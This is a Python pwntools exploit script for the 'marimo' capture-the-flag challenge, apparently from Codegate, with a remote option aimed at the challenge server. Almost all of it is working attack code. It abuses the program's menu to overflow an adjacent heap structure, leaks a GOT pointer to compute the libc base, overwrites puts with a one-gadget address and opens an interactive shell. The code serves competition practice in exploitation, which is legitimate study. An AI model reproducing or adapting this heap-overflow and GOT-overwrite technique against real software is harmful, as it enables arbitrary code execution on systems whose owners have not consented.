"""
struct marimo {
	int32_t time_shit;
	int32_t size;
	char* name;
	char* profile;
}
"""

from pwn import *
from time import sleep

puts   = 0x603018
strcmp = 0x603040

def alloc(name, prof):
	r.sendlineafter('>> ', 'show me the marimo')
	r.sendlineafter('>> ', name)
	r.sendlineafter('>> ', prof)
	return

def buy(size, name, prof):
	r.sendlineafter('>> ', 'B')
	r.sendlineafter('>> ', str(size))
	r.sendlineafter('>> ', 'P')
	r.sendlineafter('>> ', name)
	r.sendlineafter('>> ', prof)
	return

def sell(idx):
	r.sendlineafter('>> ', 'S')
	r.sendlineafter('>> ', str(idx))
	r.sendlineafter('?', 'S')
	return

def view(idx):
	r.sendlineafter('>> ', 'V')
	r.sendlineafter('>> ', str(idx))
	return	

def edit(idx, data, final):
	view(idx)
	r.sendlineafter('>> ', 'M')
	r.sendlineafter('>> ', data)

	if final:
		return
	r.sendlineafter('>> ', 'B')
	return

def leak(idx):
	view(idx)
	r.recvuntil('name : ')
	addr = u64(r.recv(6).ljust(8, '\x00'))
	r.sendlineafter('>> ', 'B')
	return addr

def pwn():

	alloc('kek', 'kek')
	alloc('kek', 'kek')
	# Get some money
	sell(0)
	sell(1)

	buy(1, 'A'*8, 'A'*8)
	buy(1, 'B'*8, 'B'*8)
	# Sleep so that time returns a big value in order to overflow.
	sleep(2)
	# Overflow adjacent marimo's pointer in order to leak
	# and overwrite puts with one gadget.
	edit(0, p64(0xb00bface) * 5 
		+ p64(0x21) 
		+ p32(0x60000000) 
		+ p32(0x80) 
		+ p64(puts) * 2
		, 0)

	libc    = leak(1) - 0x6f690
	oneshot = libc + 0x45216 
	log.success("Libc:   0x{:x}".format(libc))

	# puts => one gadget.
	edit(1, p64(oneshot), 1)

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('ch41l3ng3s.codegate.kr', 3333)
        pwn()
    else:
        r = process('./marimo')
        pause()
        pwn()
